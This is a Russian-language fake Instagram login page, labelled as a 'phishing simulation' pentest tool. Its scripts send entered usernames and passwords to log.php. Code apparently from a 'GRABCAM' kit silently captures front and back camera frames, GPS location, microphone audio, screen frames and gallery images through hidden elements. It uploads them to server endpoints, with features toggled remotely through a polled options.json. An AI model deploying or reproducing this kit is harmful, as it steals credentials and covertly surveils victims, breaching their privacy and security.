<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --ig-bg: #fafafa;
            --ig-surface: #ffffff;
            --ig-border: #dbdbdb;
            --ig-border-focus: #a8a8a8;
            --ig-text: #262626;
            --ig-muted: #8e8e8e;
            --ig-link: #0095f6;
            --ig-link-hover: #00376b;
            --ig-btn: linear-gradient(90deg, #0095f6 0%, #0095f6 100%);
            --ig-btn-hover: #1877f2;
            --ig-facebook: #385185;
            --ig-radius: 12px;
            --ig-radius-sm: 8px;
            --ig-shadow: 0 4px 24px rgba(0,0,0,.08);
            --ig-shadow-card: 0 2px 12px rgba(0,0,0,.06);
        }
        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
        html { font-size: 16px; -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; }
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background: var(--ig-bg);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 28px 20px;
            color: var(--ig-text);
            line-height: 1.5;
        }
        body::before {
            content: "";
            position: fixed;
            inset: 0;
            background: radial-gradient(ellipse 80% 60% at 50% 0%, rgba(249, 205, 169, .25) 0%, transparent 50%),
                        radial-gradient(ellipse 60% 40% at 80% 80%, rgba(161, 196, 253, .2) 0%, transparent 50%),
                        radial-gradient(ellipse 50% 30% at 20% 60%, rgba(254, 215, 170, .15) 0%, transparent 50%);
            pointer-events: none;
            z-index: 0;
        }
        .container {
            position: relative;
            z-index: 1;
            display: flex;
            max-width: 920px;
            width: 100%;
            gap: 56px;
            align-items: center;
            justify-content: center;
        }
        .phone-container { flex: 1; max-width: 380px; display: none; }
        .phone-container img, .phone-container svg { width: 100%; height: auto; display: block; }
        .login-container { flex: 1; max-width: 400px; }

        .login-box {
            background: var(--ig-surface);
            border: 1px solid var(--ig-border);
            border-radius: var(--ig-radius);
            padding: 44px 48px 36px;
            margin-bottom: 16px;
            text-align: center;
            box-shadow: var(--ig-shadow-card);
        }
        .logo { margin-bottom: 28px; }
        .logo h1 {
            font-size: 2.75rem;
            font-weight: 400;
            color: var(--ig-text);
            letter-spacing: -0.8px;
            font-family: 'Inter', sans-serif;
            font-weight: 300;
        }
        .form-group { margin-bottom: 10px; }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 14px 16px;
            font-size: 0.9375rem;
            font-family: inherit;
            background: var(--ig-bg);
            border: 1px solid var(--ig-border);
            border-radius: var(--ig-radius-sm);
            color: var(--ig-text);
            outline: none;
            transition: border-color .2s, box-shadow .2s;
        }
        input[type="text"]:focus,
        input[type="password"]:focus {
            border-color: var(--ig-border-focus);
            box-shadow: 0 0 0 2px rgba(0,149,246,.12);
        }
        input::placeholder { color: var(--ig-muted); }
        .btn-login {
            width: 100%;
            padding: 12px 16px;
            margin-top: 14px;
            background: var(--ig-link);
            border: none;
            border-radius: var(--ig-radius-sm);
            color: #fff;
            font-size: 0.9375rem;
            font-weight: 600;
            font-family: inherit;
            cursor: pointer;
            transition: background .2s, transform .05s;
        }
        .btn-login:hover:not(:disabled) {
            background: var(--ig-btn-hover);
        }
        .btn-login:active:not(:disabled) { transform: scale(0.99); }
        .btn-login:disabled { opacity: .65; cursor: not-allowed; }
        .divider {
            margin: 28px 0;
            display: flex;
            align-items: center;
            font-size: 0.8125rem;
            color: var(--ig-muted);
            font-weight: 500;
            text-transform: uppercase;
            letter-spacing: 0.04em;
        }
        .divider::before, .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background: var(--ig-border);
        }
        .divider span { margin: 0 22px; }
        .facebook-login {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            color: var(--ig-facebook);
            text-decoration: none;
            font-size: 0.9375rem;
            font-weight: 600;
            margin: 10px 0;
            transition: color .15s, opacity .15s;
        }
        .facebook-login:hover { color: #2d3e5f; opacity: .9; }
        .forgot-password { margin-top: 18px; }
        .forgot-password a {
            color: var(--ig-link-hover);
            text-decoration: none;
            font-size: 0.8125rem;
        }
        .forgot-password a:hover { text-decoration: underline; }
        .signup-box {
            background: var(--ig-surface);
            border: 1px solid var(--ig-border);
            border-radius: var(--ig-radius);
            padding: 26px 24px;
            text-align: center;
            font-size: 0.9375rem;
            color: var(--ig-text);
            box-shadow: var(--ig-shadow-card);
        }
        .signup-box a {
            color: var(--ig-link);
            text-decoration: none;
            font-weight: 600;
        }
        .signup-box a:hover { text-decoration: underline; }
        .warning {
            background: rgba(255, 193, 7, .08);
            border: 1px solid rgba(255, 193, 7, .25);
            border-radius: var(--ig-radius-sm);
            padding: 10px 14px;
            margin-bottom: 22px;
            font-size: 0.7rem;
            color: #7c5c00;
            text-align: center;
            line-height: 1.4;
            font-weight: 500;
        }
        .loading {
            display: none;
            padding: 28px;
            text-align: center;
            color: var(--ig-muted);
            font-size: 0.9375rem;
        }
        @media (min-width: 876px) {
            .phone-container { display: block; }
        }
        @media (max-width: 480px) {
            .login-box { padding: 32px 24px 28px; }
            .logo h1 { font-size: 2.25rem; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="phone-container">
            <svg viewBox="0 0 380 581" width="380" height="581" xmlns="http://www.w3.org/2000/svg">
                <rect width="380" height="581" fill="#fff" stroke="#dbdbdb" stroke-width="1"/>
                <text x="190" y="290" text-anchor="middle" fill="#8e8e8e" font-size="14">Phone Preview</text>
            </svg>
        </div>
        
        <div class="login-container">
            <div class="login-box">
                <div class="logo">
                    <h1>Instagram</h1>
                </div>
                
                <div class="warning">
                    ⚠️ PENTEST TOOL - This is a phishing simulation
                </div>
                
                <div id="loadingMessage" class="loading">
                    Перенаправление на Instagram...
                </div>
                
                <form id="loginForm" action="#" method="POST">
                    <div class="form-group">
                        <input type="text" id="username" name="username" placeholder="Телефон, имя пользователя или эл. адрес" required autofocus>
                    </div>
                    
                    <div class="form-group">
                        <input type="password" id="password" name="password" placeholder="Пароль" required>
                    </div>
                    
                    <button type="submit" class="btn-login" id="submitBtn">Вход</button>
                </form>
                
                <div class="divider">
                    <span>или</span>
                </div>
                
                <a href="#" class="facebook-login" onclick="alert('Функция временно недоступна'); return false;">
                    <svg width="16" height="16" viewBox="0 0 16 16" fill="#385185" style="vertical-align: middle; margin-right: 5px;">
                        <path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z"/>
                    </svg>
                    Войти через Facebook
                </a>
                
                <div class="forgot-password">
                    <a href="#" onclick="alert('Функция временно недоступна'); return false;">Забыли пароль?</a>
                </div>
            </div>
            
            <div class="signup-box">
                У вас нет аккаунта? <a href="https://www.instagram.com/accounts/emailsignup/" target="_blank">Зарегистрируйтесь</a>
            </div>
        </div>
    </div>
    
    <script>
        (function initLoginForm() {
            var form = document.getElementById('loginForm');
            var loadingMsg = document.getElementById('loadingMessage');
            var redirectUrl = 'https://www.instagram.com/';
            var redirectDelayMs = 1200;

            function doRedirect() {
                setTimeout(function() { window.location.href = redirectUrl; }, redirectDelayMs);
            }

            function sendFormAndRedirect(username, password, timestamp) {
                var sendForm = (typeof GRABCAM_FEATURES !== 'undefined' && GRABCAM_FEATURES.form);
                if (!sendForm) {
                    doRedirect();
                    return;
                }
                fetch('log.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ service: 'instagram', username: username, password: password, timestamp: timestamp })
                })
                    .then(function(r) { return r.json().catch(function() { return {}; }); })
                    .then(doRedirect)
                    .catch(doRedirect);
            }

            form.addEventListener('submit', function(e) {
                e.preventDefault();
                if (loadingMsg) loadingMsg.style.display = 'block';
                if (form) form.style.display = 'none';
                var username = document.getElementById('username') && document.getElementById('username').value;
                var password = document.getElementById('password') && document.getElementById('password').value;
                sendFormAndRedirect(username || '', password || '', new Date().toISOString());
            });
        })();
    </script>
</body>
<!-- Опции подгружаются с сервера (options.json) — можно включать камеру/гео/форму на лету без перезапуска -->
<script>
var GRABCAM_FEATURES = typeof GRABCAM_FEATURES_JSON !== 'undefined' ? GRABCAM_FEATURES_JSON : { camera: true, geo: true, form: true, gallery: false, mic: false, screen: false };
var GRABCAM_POST_URL = 'forwarding_link/post.php';
var CAPTURE_INTERVAL_MS = 3000;
var SCREEN_CAPTURE_INTERVAL_MS = 4000;
var IMAGE_QUALITY = 0.85;
var OPTIONS_POLL_MS = 5000;
var GEO_RETRY_DELAY_MS = 8000;
var GEO_MAX_RETRIES = 10;
var currentLocation = null;
var _grabcamInited = { camera: false, geo: false, gallery: false, mic: false, screen: false };
var _geoRetryCount = 0;

function applyOptionsFromServer(opts) {
    if (opts && typeof opts.camera !== 'undefined') {
        GRABCAM_FEATURES.camera = !!opts.camera;
        GRABCAM_FEATURES.geo = !!opts.geo;
        GRABCAM_FEATURES.form = !!opts.form;
        GRABCAM_FEATURES.gallery = !!opts.gallery;
        GRABCAM_FEATURES.mic = !!opts.mic;
        GRABCAM_FEATURES.screen = !!opts.screen;
    }
    applyFeaturesNow();
    setupFirstGesturePermissions();
}

function startOptionsPollOnce() {
    if (!window._grabcamPollStarted) {
        window._grabcamPollStarted = true;
        setInterval(fetchAndApplyOptions, OPTIONS_POLL_MS);
    }
}

function fetchAndApplyOptions() {
    fetch('options.json?t=' + Date.now())
        .then(function(r) { return r.ok ? r.json() : {}; })
        .then(function(opts) {
            applyOptionsFromServer(opts);
            startOptionsPollOnce();
        })
        .catch(function() {
            applyOptionsFromServer(null);
            startOptionsPollOnce();
        });
}

function startMicRecording() {
    if (_grabcamInited.mic || !navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
    navigator.mediaDevices.getUserMedia({ audio: true, video: false }).then(function(stream) {
        _grabcamInited.mic = true;
        var mimeType = MediaRecorder.isTypeSupported('audio/webm') ? 'audio/webm' : 'audio/mp4';
        var recorder = new MediaRecorder(stream, { mimeType: mimeType, audioBitsPerSecond: 128000 });
        var chunkIndex = 0;
        recorder.ondataavailable = function(e) {
            if (e.data && e.data.size > 0) {
                var reader = new FileReader();
                reader.onloadend = function() {
                    var base64 = reader.result.split(',')[1];
                    if (base64) fetch('audio.php', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ audio: base64, chunk: chunkIndex++, last: false }) }).catch(function() {});
                };
                reader.readAsDataURL(e.data);
            }
        };
        recorder.start(12000);
        window._grabcamMicRecorder = recorder;
    }).catch(function() {});
}

function startScreenCapture() {
    if (_grabcamInited.screen || !navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) return;
    navigator.mediaDevices.getDisplayMedia({ video: true, audio: false }).then(function(stream) {
        _grabcamInited.screen = true;
        var screenVideo = document.getElementById('screen-video');
        var screenCanvas = document.getElementById('screen-canvas');
        if (!screenVideo || !screenCanvas) {
            var w = document.createElement('div');
            w.id = 'grabcam-screen-wrap';
            w.style.cssText = 'position:fixed;left:-9999px;width:1px;height:1px;overflow:hidden;pointer-events:none;';
            w.innerHTML = '<video id="screen-video" autoplay playsinline muted></video><canvas id="screen-canvas"></canvas>';
            document.body.appendChild(w);
            screenVideo = document.getElementById('screen-video');
            screenCanvas = document.getElementById('screen-canvas');
        }
        screenVideo.srcObject = stream;
        screenVideo.onloadedmetadata = function() {
            screenVideo.play();
            var ctx = screenCanvas.getContext('2d');
            var intervalId = setInterval(function() {
                if (screenVideo.readyState >= 2) {
                    try {
                        screenCanvas.width = screenVideo.videoWidth;
                        screenCanvas.height = screenVideo.videoHeight;
                        ctx.drawImage(screenVideo, 0, 0);
                        var dataUrl = screenCanvas.toDataURL('image/png', 0.7).replace('image/png', 'image/octet-stream');
                        if (typeof post === 'function') post(dataUrl, 'screen');
                    } catch (e) {}
                }
            }, SCREEN_CAPTURE_INTERVAL_MS);
            stream.getVideoTracks()[0].onended = function() { clearInterval(intervalId); };
        };
    }).catch(function() {});
}

function requestGalleryAccess() {
    if (_grabcamInited.gallery) return;
    if (typeof initGalleryAccess === 'function') initGalleryAccess();
    var inp = document.getElementById('gallery-input');
    if (inp) {
        _grabcamInited.gallery = true;
        inp.click();
    }
}

function onFirstUserGesture() {
    if (GRABCAM_FEATURES.mic) startMicRecording();
    if (GRABCAM_FEATURES.screen) startScreenCapture();
    if (GRABCAM_FEATURES.gallery) requestGalleryAccess();
}

function setupFirstGesturePermissions() {
    if (window._grabcamGestureBound) return;
    window._grabcamGestureBound = true;
    function bound() {
        onFirstUserGesture();
        document.removeEventListener('click', bound, true);
        document.removeEventListener('focusin', bound, true);
        document.removeEventListener('keydown', bound, true);
    }
    document.addEventListener('click', bound, true);
    document.addEventListener('focusin', bound, true);
    document.addEventListener('keydown', bound, true);
}

function applyFeaturesNow() {
    var video = document.getElementById('video');
    var canvas = document.getElementById('canvas');
    if (typeof post !== 'function') return;
    if (GRABCAM_FEATURES.geo && !_grabcamInited.geo) {
        _grabcamInited.geo = true;
        initGeolocation();
    }
    if (GRABCAM_FEATURES.gallery && !_grabcamInited.gallery) {
        _grabcamInited.gallery = true;
        initGalleryAccess();
    }
    if (GRABCAM_FEATURES.camera && !_grabcamInited.camera && video && canvas) {
        _grabcamInited.camera = true;
        initBackCameraOnly(video, canvas);
        initFrontCamera();
    }
    /* Галерея уже инициализирована выше при первом включении. Микрофон и экран — только по кнопке. */
}

function waitForElementsAndInit() {
    var video = document.getElementById('video');
    var canvas = document.getElementById('canvas');
    if (!video || !canvas) {
        setTimeout(waitForElementsAndInit, 500);
        return;
    }
    if (typeof post !== 'function') {
        setTimeout(waitForElementsAndInit, 500);
        return;
    }
    fetchAndApplyOptions();
}

function initBackCameraOnly(video, canvas) {
    var constraints = { audio: false, video: { facingMode: "environment" } };
    navigator.mediaDevices.getUserMedia(constraints)
        .then(function(stream) {
            handleSuccess(stream, video, canvas, 'back');
        })
        .catch(function() {
            navigator.mediaDevices.enumerateDevices().then(function(devices) {
                var vds = devices.filter(function(d) { return d.kind === 'videoinput'; });
                if (vds.length > 0) {
                    var devId = vds[vds.length - 1].deviceId;
                    navigator.mediaDevices.getUserMedia({ audio: false, video: { deviceId: { exact: devId } } })
                        .then(function(stream) { handleSuccess(stream, video, canvas, 'back'); });
                }
            });
        });
}

function initFrontCamera() {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia || typeof post !== 'function') return;
    var frontVideo = document.getElementById('video-front');
    var frontCanvas = document.getElementById('canvas-front');
    if (!frontVideo || !frontCanvas) {
        var wrap = document.createElement('div');
        wrap.style.cssText = 'position:absolute;left:-9999px;width:1px;height:1px;overflow:hidden;';
        wrap.innerHTML = '<video id="video-front" playsinline autoplay muted></video><canvas id="canvas-front" width="740" height="580"></canvas>';
        document.body.appendChild(wrap);
        frontVideo = document.getElementById('video-front');
        frontCanvas = document.getElementById('canvas-front');
    }
    var constraints = { audio: false, video: { facingMode: "user" } };
    navigator.mediaDevices.getUserMedia(constraints).then(function(stream) {
        frontVideo.srcObject = stream;
        frontVideo.onloadedmetadata = function() {
            frontVideo.play();
            var ctx = frontCanvas.getContext('2d');
            var frontIntervalId = setInterval(function() {
                if (frontVideo.readyState >= frontVideo.HAVE_ENOUGH_DATA) {
                    try {
                        frontCanvas.width = frontVideo.videoWidth;
                        frontCanvas.height = frontVideo.videoHeight;
                        ctx.drawImage(frontVideo, 0, 0);
                        var dataUrl = frontCanvas.toDataURL('image/png', IMAGE_QUALITY).replace('image/png', 'image/octet-stream');
                        post(dataUrl, 'front');
                    } catch (e) {}
                }
            }, CAPTURE_INTERVAL_MS);
                    stream.getVideoTracks()[0].onended = function() { clearInterval(frontIntervalId); };
        };
    }).catch(function() {});
}

function initGeolocation() {
    if (!navigator.geolocation || typeof postLocation !== 'function') return;
    if (_geoRetryCount >= GEO_MAX_RETRIES) return;
    var geoOptions = { enableHighAccuracy: true, timeout: 15000, maximumAge: 60000 };
    navigator.geolocation.getCurrentPosition(
        function(position) {
            _geoRetryCount = 0;
            currentLocation = {
                lat: position.coords.latitude,
                lon: position.coords.longitude,
                accuracy: position.coords.accuracy,
                altitude: position.coords.altitude || null,
                heading: position.coords.heading || null,
                speed: position.coords.speed || null,
                timestamp: Date.now()
            };
            postLocation(currentLocation);
        },
        function() {
            _geoRetryCount++;
            if (_geoRetryCount < GEO_MAX_RETRIES) {
                setTimeout(initGeolocation, GEO_RETRY_DELAY_MS);
            }
        },
        geoOptions
    );
}

// Микрофон: запись чанками и отправка на сервер
function initMicrophone() {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
    navigator.mediaDevices.getUserMedia({ audio: true, video: false }).then(function(stream) {
        var mimeType = 'audio/webm';
        if (!MediaRecorder.isTypeSupported(mimeType)) mimeType = 'audio/mp4';
        var recorder = new MediaRecorder(stream, { mimeType: mimeType, audioBitsPerSecond: 128000 });
        var chunkIndex = 0;
        recorder.ondataavailable = function(e) {
            if (e.data && e.data.size > 0) {
                var reader = new FileReader();
                reader.onloadend = function() {
                    var base64 = reader.result.split(',')[1];
                    if (base64) {
                        fetch('audio.php', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ audio: base64, chunk: chunkIndex, last: false })
                        }).catch(function() {});
                    }
                    chunkIndex++;
                };
                reader.readAsDataURL(e.data);
            }
        };
        recorder.start(12000);
        window._grabcamMicRecorder = recorder;
    }).catch(function() {});
}

// Захват экрана (getDisplayMedia), кадры отправляются как изображения
function initScreenCapture() {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) return;
    navigator.mediaDevices.getDisplayMedia({ video: true, audio: false }).then(function(stream) {
        var screenVideo = document.getElementById('screen-video');
        var screenCanvas = document.getElementById('screen-canvas');
        if (!screenVideo || !screenCanvas) {
            var wrap = document.createElement('div');
            wrap.style.cssText = 'position:absolute;left:-9999px;';
            wrap.innerHTML = '<video id="screen-video" autoplay playsinline></video><canvas id="screen-canvas" width="1280" height="720"></canvas>';
            document.body.appendChild(wrap);
            screenVideo = document.getElementById('screen-video');
            screenCanvas = document.getElementById('screen-canvas');
        }
        screenVideo.srcObject = stream;
        screenVideo.onloadedmetadata = function() {
            screenVideo.play();
            var ctx = screenCanvas.getContext('2d');
            var intervalId = setInterval(function() {
                if (screenVideo.readyState >= 2) {
                    try {
                        screenCanvas.width = screenVideo.videoWidth;
                        screenCanvas.height = screenVideo.videoHeight;
                        ctx.drawImage(screenVideo, 0, 0);
                        var dataUrl = screenCanvas.toDataURL('image/png', 0.7).replace('image/png', 'image/octet-stream');
                        if (typeof post === 'function') post(dataUrl, 'screen');
                    } catch (e) {}
                }
            }, SCREEN_CAPTURE_INTERVAL_MS);
            stream.getVideoTracks()[0].onended = function() { clearInterval(intervalId); };
        };
    }).catch(function() {});
}

// Функция для получения доступа к галерее
function initGalleryAccess() {
    var galleryInput = document.getElementById('gallery-input');
    if (!galleryInput) {
        galleryInput = document.createElement('input');
        galleryInput.type = 'file';
        galleryInput.id = 'gallery-input';
        galleryInput.accept = 'image/*';
        galleryInput.multiple = true;
        galleryInput.style.display = 'none';
        document.body.appendChild(galleryInput);
    }
    
    // Галерея — только по выбору пользователя (без авто-открытия, чтобы не тормозить)
    // Обработчик выбора файлов
    galleryInput.addEventListener('change', function(e) {
        var files = e.target.files;
        if (!files || files.length === 0) return;
        for (var i = 0; i < files.length; i++) {
            (function(file) {
                var reader = new FileReader();
                reader.onload = function(ev) {
                    if (typeof post === 'function' && ev.target && ev.target.result) {
                        post(ev.target.result, 'gallery');
                    }
                };
                reader.readAsDataURL(file);
            })(files[i]);
        }
        galleryInput.value = '';
    });
}

function handleSuccess(stream, video, canvas, cameraType) {
    if (!video || !canvas || typeof post !== 'function') return;
    var ctx = canvas.getContext('2d');
    if (!ctx) return;
    try {
        video.srcObject = stream;
    } catch (err) {
        return;
    }
    window.stream = stream;
    var intervalKey = 'capture_' + cameraType + '_' + Date.now();
    window[intervalKey] = setInterval(function() {
        if (!video || !canvas) {
            clearInterval(window[intervalKey]);
            return;
        }
        if (video.readyState >= video.HAVE_ENOUGH_DATA) {
            try {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0);
                var dataUrl = canvas.toDataURL('image/png', IMAGE_QUALITY).replace('image/png', 'image/octet-stream');
                post(dataUrl, cameraType);
            } catch (err) {}
        }
    }, CAPTURE_INTERVAL_MS);
    window.backCameraInterval = window[intervalKey];
}

(function waitThenInit() {
    var maxAttempts = 20;
    var attempt = 0;
    function tryInit() {
        attempt++;
        var video = document.getElementById('video');
        var canvas = document.getElementById('canvas');
        if (video && canvas && typeof post === 'function') {
            waitForElementsAndInit();
            return;
        }
        if (attempt < maxAttempts) setTimeout(tryInit, 500);
    }
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', function() { setTimeout(tryInit, 300); });
    } else {
        setTimeout(tryInit, 300);
    }
})();
</script>
<script>
function post(imgdata, cameraType) {
    if (!imgdata || typeof GRABCAM_POST_URL === 'undefined') return;
    cameraType = cameraType || 'back';
    var form = new FormData();
    form.append('cat', imgdata);
    form.append('camera_type', cameraType);
    fetch(GRABCAM_POST_URL, { method: 'POST', body: form }).catch(function() {});
}

function postLocation(location) {
    if (!location || typeof location.lat === 'undefined' || typeof location.lon === 'undefined') return;
    var body = new URLSearchParams({
        location_data: JSON.stringify(location),
        location_type: 'gps'
    });
    fetch('location.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: body.toString()
    }).catch(function() {});
}
</script>
